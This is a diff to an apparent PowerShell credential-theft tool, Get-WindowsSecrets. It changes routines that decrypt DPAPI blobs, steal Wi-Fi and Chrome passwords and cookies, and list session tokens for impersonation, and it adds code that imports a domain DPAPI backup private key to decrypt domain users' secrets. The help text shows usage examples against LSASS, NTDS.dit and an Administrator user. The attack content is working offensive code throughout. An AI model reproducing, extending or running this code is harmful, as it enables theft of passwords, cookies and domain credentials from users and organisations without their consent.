@@ -4095,10 +4095,10 @@ function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy, $InUserContext, $NoMast
 		# Retrieve the decrypted data from the DATA_BLOB structure
 		If ($Res)
 		{
-			$ClearText = @()
+			$DecryptedBlob = @()
 			For ($i = 0; $i -lt $dataOut.cbData; $i += 1)
 			{
-				$ClearText += [System.Runtime.InteropServices.Marshal]::ReadByte($dataOut.pbData, $i)
+				$DecryptedBlob += [System.Runtime.InteropServices.Marshal]::ReadByte($dataOut.pbData, $i)
 			}
 		}
 		
@@ -4107,12 +4107,12 @@ function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy, $InUserContext, $NoMast
 		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($dataOut.pbData)
 	}
 
-	If (-not $ClearText -and -not $NoMasterKeysDecryption)
+	If (-not $DecryptedBlob -and -not $NoMasterKeysDecryption)
 	{
 		If ($InUserContext)
 		{
 			Write-Host("`t[-] DPAPI Blob decryption in user context failed with error {0}" -f ([CryptUnprotectHelper]::GetLastError()))
-			Write-Host("`t[+] Falling back to decrption with MasterKeys")
+			Write-Host("`t[+] Falling back to decryption with MasterKeys")
 		}
 
 		# Load C# Registry Key functions
@@ -4280,7 +4280,7 @@ function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy, $InUserContext, $NoMast
 			$Global:ALGORITHMS["CALG_3DES"] { $X = TripleDESTransform $Key $Data $IV $Mode $False }
 			$Global:ALGORITHMS["CALG_AES_256"] { $X = AESTransform $Key $Data $IV ([Security.Cryptography.CipherMode]::CBC) $False }
 		}
-		$ClearText = Unpad ($X)
+		$DecryptedBlob = Unpad ($X)
 
 		# Calculate the different HMACKeys
 		Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
@@ -4320,14 +4320,14 @@ function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy, $InUserContext, $NoMast
 
 		If ((@(Compare-Object $HMAC_Calculated1 $Signature -SyncWindow 0).Length -eq 0) -or (@(Compare-Object $HMAC_Calculated3 $Signature -SyncWindow 0).Length -eq 0))
 		{
-			return $ClearText
+			return $DecryptedBlob
 		}
 		Else
 		{
 			return $Null
 		}
 	}
-	Else { return $ClearText }
+	Else { return $DecryptedBlob }
 }
 
 <###
@@ -4465,7 +4465,7 @@ function Get-WiFiPwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 			- With System MasterKeys we can always decrypt Wi-Fi pwds
 			- Encrypted password for each Wireless interface and each SSID is located at C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<IDForWirelessInterface>\<IDForSSID>.xml
 	#>
-	Write-Host ("[===] Searching Wi-Fi pwds and decrypt them with System's Master Keys [===]")
+	Write-Host ("[===] Searching Wi-Fi pwds and decrypt them [===]")
 
 	If (Test-Path "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\*\*")
 	{
@@ -4876,7 +4876,7 @@ function Get-ChromePwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 					- Secret Pwd/Cookie = AES256-GCMDecrypt (SecretKey = LocalStateKey decrypted, IV = Nonce, AuthTag = Tag, AuthData = "", CipherText = CipherText)
 	#>
 	
-	Write-Host ("[===] Searching Chrome pwds/cookies and decrypt them with Users' Master Keys [===]")
+	Write-Host ("[===] Searching Chrome pwds/cookies and decrypt them [===]")
 
 	LoadSQLite
 
@@ -5016,7 +5016,7 @@ function Get-ChromePwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 								}
 								Catch
 								{
-									Write-Host ($_.Exception.Message)
+									Write-Host ("`t[-] Exception: {0}" -f ($_.Exception.Message))
 									Write-Host ("`t[-] AES256-GCM decryption of Chrome secret for user {0} failed" -f ($UserName))
 								}
 							}
@@ -6222,6 +6222,34 @@ function ResolveLongValue($NTDSContent, $Version, $FileFormatRevision, $PageSize
 	}
 }
 
+function ImportDomainBackupKey($DomainBackupKeyPVKBytes)
+{
+	$PVK = @{}
+	$PVK["PrivateKey"] = $DomainBackupKeyPVKBytes[24..($DomainBackupKeyPVKBytes.Length-1)]
+
+	$pk = @{}
+	$pk["Type"] = $PVK["PrivateKey"][0]
+	$pk["Version"] = $PVK["PrivateKey"][1]
+	$pk["Reserved"] = $PVK["PrivateKey"][2..3]
+	$pk["KeyAlg"] = $PVK["PrivateKey"][4..7]
+	$pk["Magic"] = $PVK["PrivateKey"][8..11]
+	$pk["BitLen"] = $PVK["PrivateKey"][12..15]
+
+	$c8 = [Math]::Ceiling([BitConverter]::ToUInt32($pk["BitLen"], 0) / 8)
+	$c16 = [Math]::Ceiling([BitConverter]::ToUInt32($pk["BitLen"], 0) / 16)
+
+	$pk["PubExp"] = $PVK["PrivateKey"][16..19]
+	$pk["Modulus"] = $PVK["PrivateKey"][20..($c8 + 19)]
+	$pk["P"] = $PVK["PrivateKey"][($c8 + 20)..($c8 + $c16 + 19)]
+	$pk["Q"] = $PVK["PrivateKey"][($c8 + $c16 + 20)..($c8 + 2 * $c16 + 19)]
+	$pk["DP"] = $PVK["PrivateKey"][($c8 + 2 * $c16 + 20)..($c8 + 3 * $c16 + 19)]
+	$pk["DQ"] = $PVK["PrivateKey"][($c8 + 3 * $c16 + 20)..($c8 + 4 * $c16 + 19)]
+	$pk["IQ"] = $PVK["PrivateKey"][($c8 + 4 * $c16 + 20)..($c8 + 5 * $c16 + 19)]
+	$pk["D"] = $PVK["PrivateKey"][($c8 + 5 * $c16 + 20)..($c8 * 2 + 5 * $c16 + 19)]
+
+	return $pk
+}
+
 function ParseDomainBackupKey($Data, $ExportDomainBackupKey, $DomainBackupKeyName)
 {
 	$PVK = @{}
@@ -6982,7 +7010,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 	return $False
 }
 
-function ListSessionTokens
+function ListSessionTokens($FilterUser)
 {
 	Write-Host ("[===] Listing Session Tokens [===]")
 
@@ -7267,20 +7295,42 @@ function ListSessionTokens
 				$Discard = [TokensAPI]::CloseHandle($LogonSessionDataPtr)
 
 				# ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:ImpersonationLevel:LogonType:IsElevatedToken:TokenElevationType
-				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}:{8}:{9}:{10}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $ImpersonationLevel, $LogonType, $TokenElevation, $TokenElevationType))
-				If ($Privileges.Length -gt 0)
+				If (-not $FilterUser)
 				{
-					Write-Host -NoNewline ("`t[+] Privileges: {0}" -f ($Privileges[0]))
-					For ($k = 1; $k -lt $Privileges.Length; $k++)
+					Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}:{8}:{9}:{10}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $ImpersonationLevel, $LogonType, $TokenElevation, $TokenElevationType))
+					If ($Privileges.Length -gt 0)
 					{
-						Write-Host -NoNewline ":"
-						Write-Host -NoNewline ($Privileges[$k])
+						Write-Host -NoNewline ("`t[+] Privileges: {0}" -f ($Privileges[0]))
+						For ($k = 1; $k -lt $Privileges.Length; $k++)
+						{
+							Write-Host -NoNewline ":"
+							Write-Host -NoNewline ($Privileges[$k])
+						}
+						Write-Host ""
 					}
-					Write-Host ""
+					Else
+					{
+						Write-Host ("`t[-] No privileges for this token")
+					}
 				}
-				Else
+
+				If ($UserName.ToString() -eq $FilterUser)
 				{
-					Write-Host ("`t[-] No privileges for this token")
+					Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}:{8}:{9}:{10}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $ImpersonationLevel, $LogonType, $TokenElevation, $TokenElevationType))
+					If ($Privileges.Length -gt 0)
+					{
+						Write-Host -NoNewline ("`t[+] Privileges: {0}" -f ($Privileges[0]))
+						For ($k = 1; $k -lt $Privileges.Length; $k++)
+						{
+							Write-Host -NoNewline ":"
+							Write-Host -NoNewline ($Privileges[$k])
+						}
+						Write-Host ""
+					}
+					Else
+					{
+						Write-Host ("`t[-] No privileges for this token")
+					}
 				}
 			}
 		}
@@ -12069,6 +12119,8 @@ function Get-LSASS($Method)
 	Decrypt DPAPI Blobs in current user context with CryptUnprotect()
 .PARAMETER NoMasterKeysDecryption
 	Skip DPAPI Blobs and MasterKeys File decryption with MasterKeys. May be use with -InUserContext flag
+.PARAMETER ImportDomainBackupKey
+	Import the Domain Backup Key content in .pvk format passed as hex string
 .PARAMETER SkipLSASS
 	Do not search into LSASS Pwdds, NT Hashes and MasterKeys for DPAPI
 .PARAMETER VNC
@@ -12085,6 +12137,8 @@ function Get-LSASS($Method)
 	Do not search into NTDS.dit
 .PARAMETER SessionTokens
 	List Session Tokens (ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:ImpersonationLevel:LogonType:IsElevatedToken:TokenElevationType) with their privileges
+.PARAMETER FilterUser
+	Filter Session Tokens for the specified user
 .PARAMETER ActivatePrivilege
 	Allow to enable the provided privilege name. The privilege have to be in your current set
 .PARAMETER Creds
@@ -12115,6 +12169,8 @@ function Get-LSASS($Method)
 .EXAMPLE
 	Get-WindowsSecrets -SessionTokens
 .EXAMPLE
+	Get-WindowsSecrets -SessionTokens -FilterUser "Administrator"
+.EXAMPLE
 	Get-WindowsSecrets -ActivatePrivilege "SeShutdownPrivilege"
 .EXAMPLE
 	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "ImpersonateLoggedOnUser"
@@ -12127,17 +12183,13 @@ function Get-LSASS($Method)
 .EXAMPLE
 	Get-WindowsSecrets -LSASS
 .EXAMPLE
-	Get-WindowsSecrets -DPAPI
+	Get-WindowsSecrets -DPAPI [-SkipLSASS] [-SkipNTDS]
 .EXAMPLE
-	Get-WindowsSecrets -DPAPI -InUserContext
+	Get-WindowsSecrets -DPAPI -ImportDomainBackupKey <HexStringDomainBackupKeyPVKFormat> -SkipNTDS
 .EXAMPLE
-	Get-WindowsSecrets -DPAPI -InUserContext -NoMasterKeysDecryption
+	Get-WindowsSecrets -DPAPI -InUserContext [-NoMasterKeysDecryption]
 .EXAMPLE
 	Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2'
-.EXAMPLE
-	Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2' -SkipLSASS
-.EXAMPLE
-	Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2' -SkipLSASS -SkipNTDS
 #>
 function Get-WindowsSecrets()
 {
@@ -12158,12 +12210,14 @@ function Get-WindowsSecrets()
 		[Parameter(Mandatory=$False)][String]$NTHashes,
 		[Parameter(Mandatory=$False)][Switch]$InUserContext,
 		[Parameter(Mandatory=$False)][Switch]$NoMasterKeysDecryption,
+		[Parameter(Mandatory=$False)][String]$ImportDomainBackupKey,
 		
 		[Parameter(Mandatory=$False)][Switch]$SkipLSASS,
 		[Parameter(Mandatory=$False)][Switch]$SkipNTDS,
 		[Parameter(Mandatory=$False)][Switch]$ExportDomainBackupKey,
 		
 		[Parameter(Mandatory=$False)][Switch]$SessionTokens,
+		[Parameter(Mandatory=$False)][String]$FilterUser,
 		[Parameter(Mandatory=$False)][String]$ActivatePrivilege,
 		[Parameter(Mandatory=$False)][Switch]$Impersonate,
 		[Parameter(Mandatory=$False)][Int]$TokenProcID,
@@ -12256,7 +12310,7 @@ function Get-WindowsSecrets()
 	# Session Tokens
 	If ($SessionTokens)
 	{
-		$Tokens = ListSessionTokens
+		$Tokens = ListSessionTokens $FilterUser
 	}
 
 	# Enable privilege
@@ -12346,6 +12400,12 @@ function Get-WindowsSecrets()
 					$DomainBackupKey = $DomainBackupKeys[$DomainBackupKeyName]
 				}
 			}
+		}
+
+		If ($ImportDomainBackupKey)
+		{
+			$DomainBackupKeyPVKBytes = HexStringToBytes $ImportDomainBackupKey
+			$DomainBackupKey = ImportDomainBackupKey $DomainBackupKeyPVKBytes
 		}
 
 		# Get potential Pwds from parameters for DPAPI User PreKeys
